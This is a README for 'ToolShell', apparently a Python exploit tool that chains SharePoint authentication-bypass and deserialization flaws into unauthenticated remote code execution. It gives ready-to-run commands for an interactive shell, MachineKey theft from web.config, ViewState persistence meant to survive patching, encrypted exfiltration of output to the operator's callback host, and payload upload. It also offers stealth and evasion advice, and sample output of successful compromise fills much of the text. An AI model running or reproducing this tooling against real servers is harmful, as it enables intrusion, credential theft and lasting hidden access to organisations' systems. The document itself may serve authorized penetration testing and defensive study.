# ToolShell Exploit - CVE-2025-49706 + CVE-2025-49704

SharePoint Server Unauthenticated Remote Code Execution exploit chain.

## Check Demo  
<img width="1461" height="470" alt="image" src="https://github.com/user-attachments/assets/e65fa2aa-2dd4-485a-a79c-30ef78102b7d" />

## Auto-Pwn Demo  
<img width="1453" height="638" alt="image" src="https://github.com/user-attachments/assets/559c5064-591c-4ebd-9c0b-e3538fe6074e" />  
<img width="1448" height="728" alt="image" src="https://github.com/user-attachments/assets/ec33babb-28e3-4d67-8c9c-a189bbc4bab7" />

## Shell Demo  
<img width="1683" height="787" alt="image" src="https://github.com/user-attachments/assets/2dca6506-77b2-4d17-ae28-06e9d152d37c" />
<img width="1682" height="792" alt="image" src="https://github.com/user-attachments/assets/7e549e59-e5fb-481d-a990-7dd49029f1d4" />


## Vulnerability Overview

**ToolShell** is a two-bug chain discovered and demonstrated at Pwn2Own Berlin 2025:

1. **CVE-2025-49706** - Authentication Bypass
   - Endpoint: `/_layouts/15/ToolPane.aspx?DisplayMode=Edit`
   - Bypass: Set `Referer: /_layouts/SignOut.aspx` header

2. **CVE-2025-49704** - Deserialization RCE  
   - Gadget: `Microsoft.PerformancePoint.Scorecards.Client.dll` - `ExcelDataSet`
   - Parameter: `MSOTlPn_DWP` contains malicious control definition
   - The `CompressedDataTable` attribute is deserialized via BinaryFormatter

3. **CVE-2025-53770** - Patch Bypass for CVE-2025-49704 (Auto-detected)
   - Adds trailing whitespace to `Namespace` and `Tagprefix` attributes
   - Bypasses the blocklist check in Microsoft's initial patch
   - **Automatically used when needed** - the tool detects which method works

## Affected Versions

- SharePoint Server 2016 (all builds without July 2025 patch)
- SharePoint Server 2019 (all builds without July 2025 patch)
- SharePoint Server Subscription Edition < 16.0.18526.20508

**Note:** The tool automatically detects and uses CVE-2025-53770 bypass when CVE-2025-49704 is patched.

## Requirements

- Python 3.8+
- Custom `ysoserial.exe` with DataSetXML gadget from https://github.com/l0ggg/ToolShell

## Quick Start

### Interactive Shell (Recommended)

```bash
python toolshell.py -t https://sharepoint.target.com --shell \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP --callback-port 8888
```

This starts an interactive pseudo-shell where you can run commands and see output.

### Run Single Command

```bash
python toolshell.py -t https://sharepoint.target.com --run-cmd "whoami" \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP
```

### Extract MachineKey for Persistence

```bash
python toolshell.py -t https://sharepoint.target.com --auto-pwn \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP
```

### Check Vulnerability Status (with RCE test)

```bash
# Full check - tests auth bypass AND RCE (recommended)
python toolshell.py -t https://sharepoint.target.com --check \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP

# Quick check - only tests auth bypass
python toolshell.py -t https://sharepoint.target.com --check
```

The full check will report:
- CVE-2025-49706 (Auth Bypass) status
- CVE-2025-49704 (Deserialization) status  
- CVE-2025-53770 (Patch Bypass) status

### ViewState RCE (After Extracting MachineKey)

After extracting MachineKey with `--auto-pwn`, use ViewState-based RCE for persistence:

```bash
# ViewState shell (survives patching of original vuln)
python toolshell.py -t https://sharepoint.target.com --viewstate-shell \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP \
  --validation-key "515901EB..." --decryption-key "5A67E628..."

# Single ViewState command
python toolshell.py -t https://sharepoint.target.com --viewstate-cmd "whoami" \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP \
  --validation-key "515901EB..." --decryption-key "5A67E628..."

# Target a different page (for stealth/alternative access)
python toolshell.py -t https://sharepoint.target.com --viewstate-cmd "whoami" \
  --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP \
  --validation-key "515901EB..." --decryption-key "5A67E628..." \
  --viewstate-page "/_layouts/15/start.aspx"
```

### Enumerate ViewStateGenerators

Different ASP.NET pages have different ViewStateGenerator values. Use `check_generators.py` to discover accessible pages and their generators:

```bash
python check_generators.py <target_url>
python check_generators.py http://192.168.5.135
```

Example output:
```
Page                                               Generator
-----------------------------------------------------------------
/_layouts/15/ToolPane.aspx?ToolPaneInfo=True       095EA52E
/_layouts/15/listedit.aspx                         F3F6CE2F
/_layouts/15/start.aspx                            A31D3FD9
```

The main tool automatically fetches the correct generator for the target page, but this script is useful for reconnaissance.

## Command-Line Options

| Option | Description |
|--------|-------------|
| `-t, --target` | Target SharePoint URL |
| `--check` | Check if target is vulnerable (add --callback-ip for full RCE test) |
| `--shell` | Start interactive pseudo-shell |
| `--run-cmd CMD` | Run single command and show output |
| `--auto-pwn` | Extract MachineKey for ViewState persistence |
| `--viewstate-shell` | Shell using signed ViewState (requires MachineKey) |
| `--viewstate-cmd CMD` | Single command via ViewState (requires MachineKey) |
| `--viewstate-page PATH` | Target page for ViewState attack (default: ToolPane.aspx) |
| `--validation-key KEY` | MachineKey validationKey (hex string) |
| `--decryption-key KEY` | MachineKey decryptionKey (hex string) |
| `--validation-alg ALG` | Validation algorithm (default: HMACSHA256) |
| `--ysoserial PATH` | Path to ysoserial.exe (required for exploitation) |
| `--callback-ip IP` | Your IP for HTTP callback |
| `--callback-port PORT` | Callback port (default: 8888) |
| `--proxy URL` | Proxy URL (e.g., http://127.0.0.1:8080) |
| `--timeout SEC` | Request timeout in seconds (default: 30) |
| `-v, --verbose` | Verbose output |

## Automatic Patch Detection

The tool automatically detects whether the target has patched CVE-2025-49704:

1. First tries the **normal payload** (CVE-2025-49704)
2. If blocked, automatically tries **whitespace bypass** (CVE-2025-53770)
3. Reports which method succeeded or if target is fully patched

Example output:
```
[*] Testing CVE-2025-49704 (normal payload)...
[-] CVE-2025-49704 patched or blocked
[*] Testing CVE-2025-53770 (whitespace bypass)...
[+] CVE-2025-53770 bypass - RCE successful!
[+] Using CVE-2025-53770 for exploitation
```

## How It Works

### Pseudo-Shell Mode

The `--shell` mode provides an interactive experience:

1. Starts HTTP listener on your machine
2. Each command you type is wrapped to exfiltrate output via HTTP callback
3. Command is serialized into BinaryFormatter payload
4. Payload sent via deserialization vulnerability
5. Output received via HTTP POST callback
6. Displayed in your terminal

```
SP C:\> whoami
evilcorp\sharepoint

SP C:\> hostname
SP2016-SERVER

SP C:\> ls C:\inetpub
Mode         LastWriteTime     Length Name
----         -------------     ------ ----
d-----  1/1/2025   9:00 AM            wwwroot
...
```

### Shell File Operations

The shell includes built-in file operations:

| Command | Description |
|---------|-------------|
| `ls [path]` / `dir [path]` | List directory contents |
| `cd <path>` | Change working directory |
| `pwd` | Print current directory |
| `cat <file>` | Display file contents |
| `download <remote> [local]` | Download file from target |
| `upload <local> <remote>` | Upload file to target |

**Examples:**

```
SP C:\> cd Windows\Temp
SP C:\Windows\Temp\> ls
Mode         LastWriteTime       Length Name
----         -------------       ------ ----
-a----  1/6/2026  10:30 AM         1234 example.txt

SP C:\Windows\Temp\> cat example.txt
This is the file content...

SP C:\Windows\Temp\> download example.txt ./loot/example.txt
[+] Downloaded 1234 bytes to ./loot/example.txt

SP C:\Windows\Temp\> upload ./payload.exe C:\Windows\Temp\payload.exe
[+] Uploaded 45678 bytes to C:\Windows\Temp\payload.exe
```

### Security Features

- **XOR-encrypted callbacks**: All data exfiltrated via HTTP callbacks is XOR-encrypted with a random 16-byte key generated per session
- **POST-only exfiltration**: Output is sent via HTTP POST body (not GET parameters) to avoid logging sensitive data in URLs
- **Random User-Agent**: Each session uses a randomly selected browser User-Agent

### MachineKey Extraction

The `--auto-pwn` mode extracts the MachineKey from web.config:

1. Dynamically discovers web.config path
2. Extracts `validationKey`, `decryptionKey`, and algorithm
3. These can be used to create signed ViewState payloads for persistent access

### ViewState RCE (Persistence Method)

After extracting MachineKey, the `--viewstate-shell` and `--viewstate-cmd` modes provide RCE via signed ViewState payloads.

**Why use ViewState RCE?**

| Aspect | Original Exploit | ViewState Method |
|--------|-----------------|------------------|
| Vulnerability | CVE-2025-49704 (ToolPane.aspx) | ViewState deserialization |
| Auth Bypass | Requires CVE-2025-49706 | Keys make payload "trusted" |
| Endpoint | Only ToolPane.aspx | Any page with ViewState |
| Detection | Suspicious ToolPane requests | Normal-looking POSTs |
| If Patched | Stops working | **Still works** |

**Key benefits:**
- Survives patching of the original ToolPane.aspx vulnerability
- Looks like normal form submissions (stealthier)
- Can target any SharePoint page
- Provides persistence after initial compromise

```
VS> whoami
evilcorp\sharepoint

VS> hostname
SP2016-SERVER
```

## Troubleshooting

### No callback received
1. Check firewall allows inbound on callback port (default: 8888)
2. Verify target can reach your IP
3. Try different port: `--callback-port 9999`

### HTTP 401/403
- Target may be patched
- WAF blocking Referer manipulation
- Try with `--proxy http://127.0.0.1:8080` to debug

### Timeout waiting for output
- Some commands take longer, increase `--timeout`
- Check if command syntax is correct (PowerShell on target)

### ViewState payload not executing
- Verify MachineKey values are correct (from --auto-pwn)
- Ensure target hasn't regenerated keys since extraction
- Try different gadget if TypeConfuseDelegate fails

## References
- https://blog.viettelcybersecurity.com/sharepoint-toolshell/
- https://research.eye.security/sharepoint-under-siege/
- https://github.com/l0ggg/ToolShell
- https://github.com/irsdl/ysonet

## Disclaimer

For authorized security testing only. Unauthorized access to computer systems is illegal.